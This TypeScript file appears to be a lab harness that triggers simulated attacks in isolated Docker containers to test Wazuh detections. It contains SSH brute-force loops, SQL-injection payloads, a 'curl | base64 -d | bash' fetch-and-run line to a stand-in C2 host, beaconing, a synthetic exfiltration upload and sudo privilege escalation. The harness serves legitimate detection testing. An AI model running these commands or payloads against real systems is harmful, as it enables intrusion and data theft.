/**
 * simulations.ts — the attack/event simulations for TC-01..TC-10 (TEST ENVIRONMENT ONLY).
 *
 * Every action happens inside three containers on the isolated Wazuh Docker network (single-node_default, no
 * published ports): `vigix-lab-attacker` (source of remote traffic), `vigix-attack-endpoint` (the monitored Ubuntu
 * box running a Wazuh agent) and `vigix-eval-testserver` (the "C2 / exfil" sink). Nothing touches the Internet,
 * production, or real data: credentials are the lab's throw-away ones, files are synthetic/EICAR, e-mail is not sent.
 *
 * Each simulation returns the UTC window it ran in; the runner then reads the resulting REAL Wazuh alert from
 * the Wazuh Indexer. Where the stock ruleset has no rule, the endpoint additionally appends a JSON telemetry line to
 * /var/log/vigix-eval/events.json — ("controlled telemetry") — and the result says so; it is never presented as a
 * stock detection.
 */
import { execFileSync, spawnSync } from "node:child_process";

export const ATTACKER = "vigix-lab-attacker";
export const ENDPOINT = "vigix-attack-endpoint";
export const TESTSERVER = "vigix-eval-testserver";
export const ENDPOINT_AGENT = "attack-endpoint";
/** TC-05 runs on a separate REAL Windows 10 endpoint (VMware VM) whose Wazuh agent 4.9.2 is enrolled as this name. */
export const WINDOWS_AGENT = "vigix-win10-ps";
/** The Wazuh agent whose alert a case is read from. */
export const agentForCase = (caseId: string): string => (caseId === "TC-05" ? WINDOWS_AGENT : ENDPOINT_AGENT);

const EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
const EICAR_SHA256 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f";

export function docker(args: string[], input?: string, timeoutMs = 120000): string {
  return execFileSync("docker", args, { encoding: "utf8", input, timeout: timeoutMs, stdio: ["pipe", "pipe", "pipe"], windowsHide: true });
}
/** docker with stdout+stderr merged (wazuh-logtest prints its result on stderr). */
export function dockerAll(args: string[], input?: string): string {
  const r = spawnSync("docker", args, { encoding: "utf8", input, timeout: 60000, windowsHide: true });
  return `${r.stdout ?? ""}${r.stderr ?? ""}`;
}
const sh = (container: string, script: string, timeoutMs?: number) => docker(["exec", container, "sh", "-c", script], undefined, timeoutMs);
const sleepMs = (ms: number) => new Promise((r) => setTimeout(r, ms));

export const containerIp = (name: string) => docker(["inspect", name, "--format", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}"]).trim();

export interface SimResult {
  caseId: string;
  startedAt: string;      // ISO UTC, taken BEFORE the first action
  endedAt: string;        // ISO UTC, after the last action
  telemetry: "REAL_EVENTS_STOCK_RULE" | "REAL_ACTION_CUSTOM_RULE" | "CONTROLLED_TELEMETRY_CUSTOM_RULE" | "REAL_WINDOWS_SYSMON_CUSTOM_RULE" | "ENVIRONMENT_UNAVAILABLE";
  facts: Record<string, string | number>;
  notes: string[];
}

/**
 * TC-05 scenario DEFINITION (how to trigger it - not telemetry). The harness never writes an alert or an event: the
 * Windows endpoint produces the Sysmon event, Wazuh raises rule 100300, and the runner reads that REAL alert from the
 * Wazuh Indexer like for every other case.
 *   TC05_TRIGGER=manual (default)  the runner prints the command and waits (TC05_OPERATOR_WAIT_MS, default 10 min) for the
 *                                  operator to run it on the Windows VM;
 *   TC05_TRIGGER=command           the runner runs TC05_TRIGGER_COMMAND (e.g. a vmrun/WinRM wrapper configured by the
 *                                  operator; no credential is stored in the repository).
 */
export const TC05_SCENARIO = {
  id: "TC-05 PowerShell DNS scenario",
  agent: WINDOWS_AGENT,
  domain: "vigix-eval-ps-stager.test",
  command: `powershell.exe -NoProfile -Command "try { [System.Net.Dns]::GetHostAddresses('vigix-eval-ps-stager.test') } catch { 'lookup failed (expected)' }"`,
  expectedTelemetry: "Sysmon event 22 (DnsQuery): image=powershell.exe, queryName=vigix-eval-ps-stager.test",
  expectedRule: { id: "100300", level: 12, mitre: "T1059.001" },
} as const;
export const TC05_OPERATOR_WAIT_MS = Number(process.env.TC05_OPERATOR_WAIT_MS ?? 10 * 60 * 1000);
export const tc05TriggerMode = (): "manual" | "command" => (process.env.TC05_TRIGGER === "command" ? "command" : "manual");
/** How long the runner waits for the REAL alert of a case (an operator-triggered case needs longer than a scripted one). */
export const alertWaitMsForCase = (caseId: string): number => (caseId === "TC-05" && tc05TriggerMode() === "manual" ? TC05_OPERATOR_WAIT_MS : 150000);

/** Facts known BEFORE any attack (used to resolve ground-truth placeholders). */
export function environmentFacts(): Record<string, string> {
  return { ATTACKER_IP: containerIp(ATTACKER), ENDPOINT_IP: containerIp(ENDPOINT), TESTSERVER_IP: containerIp(TESTSERVER), KWORKERD_SHA256: sh(ENDPOINT, "sha256sum /bin/sleep | cut -d' ' -f1").trim(), ATTEMPTED_USER: ["admin", "oracle", "test", "git", "postgres", "ubuntu", "deploy", "backup", "user1", "support"].join("|") };
}

/** Idempotent lab preparation. Also removes artifacts of earlier runs so every case starts from a known state. */
export function prepareLab(): string[] {
  const log: string[] = [];
  const f = environmentFacts();
  const running = docker(["ps", "--format", "{{.Names}}"]).split(/\r?\n/);
  for (const c of [ATTACKER, ENDPOINT, TESTSERVER]) {
    if (!running.includes(c)) throw new Error(`lab container ${c} is not running`);
  }
  sh(ATTACKER, "which curl sshpass ssh >/dev/null 2>&1 || apk add --no-cache curl openssh-client sshpass >/dev/null 2>&1; which curl sshpass ssh");
  // domains for the controlled test server live only in the endpoint's hosts file (no public DNS involved)
  sh(ENDPOINT, `sed -i '/vigix-eval-/d' /etc/hosts; echo '${f.TESTSERVER_IP} vigix-eval-c2.net vigix-eval-exfil.net' >> /etc/hosts`);
  sh(ENDPOINT, "mkdir -p /root/Downloads /var/log/vigix-eval /tmp/.cache; touch /var/log/vigix-eval/events.json; rm -f /root/Downloads/*.exe /tmp/test-data.txt; userdel -r evaluser 2>/dev/null; rm -f /etc/ld.so.preload; true");
  log.push(`attacker=${f.ATTACKER_IP} endpoint=${f.ENDPOINT_IP} testserver=${f.TESTSERVER_IP}`);
  return log;
}

function appendTelemetry(event: Record<string, unknown>): void {
  docker(["exec", "-i", ENDPOINT, "sh", "-c", "cat >> /var/log/vigix-eval/events.json"], JSON.stringify(event) + "\n");
}

const now = () => new Date();
const iso = (d: Date) => d.toISOString();

/** ssh attempt from the attacker container to the endpoint. */
const sshTry = (user: string, pw: string, cmd = "exit") =>
  `sshpass -p '${pw}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 -o PreferredAuthentications=password -o PubkeyAuthentication=no ${user}@${ENDPOINT} ${cmd} >/dev/null 2>&1 || true`;

export async function simulate(caseId: string, f: Record<string, string>): Promise<SimResult> {
  const startedAt = now();
  const notes: string[] = [];
  const facts: Record<string, string | number> = { attackerIp: f.ATTACKER_IP, endpointIp: f.ENDPOINT_IP, testServerIp: f.TESTSERVER_IP };
  let telemetry: SimResult["telemetry"] = "REAL_EVENTS_STOCK_RULE";

  switch (caseId) {
    case "TC-01": {
      const users = ["admin", "oracle", "test", "git", "postgres", "ubuntu", "deploy", "backup", "user1", "support"];
      sh(ATTACKER, users.map((u) => sshTry(u, "wrongpass")).join("; "), 180000);
      facts.usersTried = users.join(",");
      break;
    }
    case "TC-04": {
      const fails = Array.from({ length: 9 }, (_, i) => sshTry("victim", `badpw${i}`)).join("; ");
      sh(ATTACKER, `${fails}; ${sshTry("victim", "VictimPass123!", "id")}`, 180000);
      facts.account = "victim";
      break;
    }
    case "TC-06": {
      const p = ["id=1%20union%20select%20username,password%20from%20users", "id=1%20or%201=1%20union%20select%20null%20from%20dual", "id=1%20union%20select%20load_file('/etc/passwd')",
        "name=x%20union%20select%20null,null,null%20from%20users", "q=1%20union%20select%20table_name%20from%20information_schema.tables", "cat=1%20union%20select%20*%20from%20accounts%20where%201=1",
        "uid=1%20union+select+pass+from+admins", "id=1%20union%20select%20credit_card%20from%20payments", "page=1%20union%20select%20null%20from%20where%20id=1", "item=1%20union%20select%20user%20from%20mysql.user",
        "pid=1%20union%20select%20version%20from%20sys.version", "ref=1%20union%20select%20null%20from%20sessions"];
      sh(ATTACKER, p.map((q) => `curl -s -o /dev/null -A 'sqlmap/1.7' 'http://${ENDPOINT}/app/search.php?${q}'`).join("; "), 120000);
      facts.requests = p.length;
      break;
    }
    case "TC-02": {
      telemetry = "REAL_ACTION_CUSTOM_RULE";
      const path = "/root/Downloads/Invoice_Q4_2026.xls.exe";
      // exact EICAR bytes (no trailing newline) so the FIM sha256 equals the published EICAR hash
      docker(["exec", "-i", ENDPOINT, "sh", "-c", `rm -f ${path}; cat > ${path}`], EICAR);
      facts.filePath = path;
      facts.expectedSha256 = EICAR_SHA256;
      facts.actualSha256 = sh(ENDPOINT, `sha256sum ${path} | cut -d' ' -f1`).trim();
      notes.push("EICAR is the industry-standard harmless AV test string, not malware.");
      break;
    }
    case "TC-03": {
      telemetry = "CONTROLLED_TELEMETRY_CUSTOM_RULE";
      appendTelemetry({
        vigix: { event_type: "phishing_url_delivered" }, srcip: "203.0.113.45", url: "http://vigix-eval-phish.net/o365/verify?id=hr.clerk",
        dns: { question: { name: "vigix-eval-phish.net" } },
        email: { from: "it-support@vigix-eval-phish.net", to: "hr.clerk@corp.local", subject: "[Action Required] Your mailbox will be deactivated in 24 hours" },
        message: "Phishing link from it-support@vigix-eval-phish.net (sending MTA 203.0.113.45, RFC 5737 documentation address) delivered to hr.clerk@corp.local; SPF=fail DKIM=none",
      });
      notes.push("No e-mail was sent and no connection was made: controlled mail-gateway telemetry only.");
      break;
    }
    case "TC-07": {
      telemetry = "CONTROLLED_TELEMETRY_CUSTOM_RULE";
      for (let i = 1; i <= 3; i++) {
        const out = sh(ENDPOINT, `curl -s -o /dev/null -w '%{remote_ip} %{http_code} %{size_upload} %{size_download}' -m 5 http://vigix-eval-c2.net:8080/gate.php?beacon=${i}`).trim().split(" ");
        appendTelemetry({
          vigix: { event_type: "c2_beacon" }, srcip: f.ENDPOINT_IP, dstip: out[0], dstport: 8080, url: "http://vigix-eval-c2.net:8080/gate.php",
          dns: { question: { name: "vigix-eval-c2.net" } }, http_status: Number(out[1]), beacon_seq: i, interval_seconds: 2,
          message: `Beacon ${i}/3 ${f.ENDPOINT_IP} -> ${out[0]}:8080 http://vigix-eval-c2.net:8080/gate.php (regular 2s interval)`,
        });
        if (i < 3) await sleepMs(2000);
      }
      notes.push("Beacons are real HTTP requests to the isolated Docker test server; the telemetry line is generated by the harness.");
      break;
    }
    case "TC-08": {
      telemetry = "CONTROLLED_TELEMETRY_CUSTOM_RULE";
      const cmdline = "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash";
      // Real process from a world-writable path (sleep renamed), owned by www-data, detached (setsid) so it is still
      // alive when it is inspected; plus the harmless pipeline (the sink returns an EMPTY body, nothing executes).
      const pid = sh(ENDPOINT, "cp /bin/sleep /tmp/.cache/kworkerd; chmod 755 /tmp/.cache/kworkerd; su -s /bin/sh www-data -c 'setsid /tmp/.cache/kworkerd 40 >/dev/null 2>&1 < /dev/null & echo $!'").trim();
      sh(ENDPOINT, `su -s /bin/sh www-data -c "bash -c '${cmdline}'" >/dev/null 2>&1 || true`);
      await sleepMs(500);
      const ps = sh(ENDPOINT, `test -d /proc/${pid} || { echo DEAD; exit 0; }; echo "$(tr '\\0' ' ' < /proc/${pid}/cmdline | cut -d' ' -f1)|$(ps -o ppid= -p ${pid} | tr -d ' ')|$(ps -o user= -p ${pid})|$(id -u www-data)"`).trim();
      if (ps === "DEAD" || ps.split("|").some((x) => !x)) throw new Error(`TC-08: simulated process ${pid} is not alive; refusing to fabricate process telemetry (${ps})`);
      const [exe, ppid, user, uid] = ps.split("|");
      // Attributes the real process has, read from the endpoint (nothing invented): sha256 of the real dropped file and the
      // parent process name. The sha256 must equal the pre-attack fact KWORKERD_SHA256 (the file is a copy of /bin/sleep).
      const sha256 = sh(ENDPOINT, "sha256sum /tmp/.cache/kworkerd | cut -d' ' -f1").trim();
      const parent = sh(ENDPOINT, `ps -o comm= -p ${ppid} | tr -d ' '`).trim();
      if (!/^[a-f0-9]{64}$/.test(sha256)) throw new Error(`TC-08: could not read the sha256 of the real dropped file (${sha256})`);
      if (sha256 !== f.KWORKERD_SHA256) throw new Error(`TC-08: sha256 of /tmp/.cache/kworkerd (${sha256}) differs from the pre-attack fact (${f.KWORKERD_SHA256})`);
      // (exe comes from /proc/PID/cmdline: readlink /proc/PID/exe needs CAP_SYS_PTRACE, absent in the container)
      // auditd-style layout (data.audit.*): Wazuh's index template maps data.process as an OBJECT, so a scalar
      // `process` field is rejected by the indexer (mapper_parsing_exception) � found in the Clean Run.
      appendTelemetry({
        vigix: { event_type: "suspicious_process" }, audit: { exe, command: cmdline, ppid: Number(ppid), parent, uid, user, pid: Number(pid) },
        // same values again in the scalar fields the IOC extractor reads (data.command / data.file / data.sha256)
        command: cmdline, file: exe, sha256, agent_host: ENDPOINT_AGENT,
        message: `process ${exe} (pid ${pid}, ppid ${ppid} ${parent}, user ${user}, sha256 ${sha256}) running from a world-writable path; parent shell command: ${cmdline}`,
      });
      facts.pid = pid; facts.exe = exe; facts.user = user; facts.sha256 = sha256; facts.parentProcess = parent; facts.commandLine = cmdline;
      notes.push("Process is real (sleep renamed kworkerd, alive when inspected); the telemetry line is generated by the harness from /proc, in the auditd data.audit.* layout.");
      break;
    }
    case "TC-09": {
      telemetry = "CONTROLLED_TELEMETRY_CUSTOM_RULE";
      sh(ENDPOINT, "head -c 3145728 /dev/zero | tr '\\0' 'A' > /tmp/test-data.txt");
      const t0 = Date.now();
      const out = sh(ENDPOINT, "curl -s -o /dev/null -w '%{remote_ip} %{http_code} %{size_upload}' -m 30 -X POST --data-binary @/tmp/test-data.txt http://vigix-eval-exfil.net:8080/upload").trim().split(" ");
      const secs = Math.max(1, Math.round((Date.now() - t0) / 1000));
      appendTelemetry({
        vigix: { event_type: "data_exfiltration" }, srcip: f.ENDPOINT_IP, dstip: out[0], dstport: 8080, url: "http://vigix-eval-exfil.net:8080/upload",
        dns: { question: { name: "vigix-eval-exfil.net" } }, file: "/tmp/test-data.txt", bytes_out: Number(out[2]), duration_seconds: secs, http_status: Number(out[1]),
        message: `${Number(out[2])} bytes /tmp/test-data.txt uploaded ${f.ENDPOINT_IP} -> ${out[0]}:8080 http://vigix-eval-exfil.net:8080/upload in ${secs}s`,
      });
      facts.bytesOut = Number(out[2]); facts.durationSeconds = secs;
      sh(ENDPOINT, "rm -f /tmp/test-data.txt");
      notes.push("Synthetic 3 MB of 'A' bytes, discarded by the sink. No real or personal data.");
      break;
    }
    case "TC-10": {
      telemetry = "REAL_ACTION_CUSTOM_RULE";
      sh(ENDPOINT, "useradd -m -s /bin/bash evaluser; sleep 2; usermod -aG sudo evaluser; sleep 1");
      facts.user = "evaluser"; facts.oldPrivilege = "standard user (no sudo)"; facts.newPrivilege = "member of group sudo";
      facts.command = "usermod -aG sudo evaluser";
      notes.push("Test-only account evaluser; removed in cleanup.");
      break;
    }
    case "TC-05": {
      telemetry = "REAL_WINDOWS_SYSMON_CUSTOM_RULE";
      const mode = tc05TriggerMode();
      facts.windowsAgent = TC05_SCENARIO.agent; facts.domain = TC05_SCENARIO.domain; facts.triggerMode = mode; facts.command = TC05_SCENARIO.command;
      if (mode === "command") {
        const cmd = process.env.TC05_TRIGGER_COMMAND;
        if (!cmd) throw new Error("TC05_TRIGGER=command needs TC05_TRIGGER_COMMAND (a command that runs the scenario on the Windows endpoint)");
        const r = spawnSync(cmd, { shell: true, encoding: "utf8", timeout: 120000, windowsHide: true });
        facts.triggerExitCode = r.status ?? -1;
        if (r.status !== 0) throw new Error(`TC-05 trigger command failed (exit ${r.status}): ${(r.stderr ?? "").slice(0, 200)}`);
        notes.push("Triggered by TC05_TRIGGER_COMMAND on the Windows endpoint.");
      } else {
        console.log(`\n   >>> TC-05 OPERATOR ACTION: on the Windows VM (${TC05_SCENARIO.agent}) run, in PowerShell:\n   >>> ${TC05_SCENARIO.command}\n   >>> waiting up to ${Math.round(TC05_OPERATOR_WAIT_MS / 1000)}s for the REAL Wazuh alert (rule ${TC05_SCENARIO.expectedRule.id})...`);
        notes.push("Operator-triggered: the scenario command is run by a person on the Windows endpoint; detection latency therefore includes the operator's reaction time.");
      }
      notes.push(`Scenario: ${TC05_SCENARIO.id}. Expected telemetry: ${TC05_SCENARIO.expectedTelemetry}. Nothing is simulated by the harness; the alert is read from the Wazuh Indexer.`);
      break;
    }
    default:
      throw new Error(`unknown case ${caseId}`);
  }
  return { caseId, startedAt: iso(startedAt), endedAt: iso(now()), telemetry, facts, notes };
}

/** Undo the lab-side effects of a case (test account, dropped files, processes). Never touches anything else. */
export function cleanupCase(caseId: string): void {
  const s: Record<string, string> = {
    "TC-02": "rm -f /root/Downloads/Invoice_Q4_2026.xls.exe",
    "TC-08": "pkill -f /tmp/.cache/kworkerd; rm -f /tmp/.cache/kworkerd",
    "TC-09": "rm -f /tmp/test-data.txt",
    "TC-10": "userdel -r evaluser 2>/dev/null; true",
    // TC-05: nothing to undo - a DNS lookup of a reserved-TLD name leaves no artifact on the Windows endpoint.
  };
  if (s[caseId]) { try { sh(ENDPOINT, s[caseId]); } catch { /* best effort */ } }
}
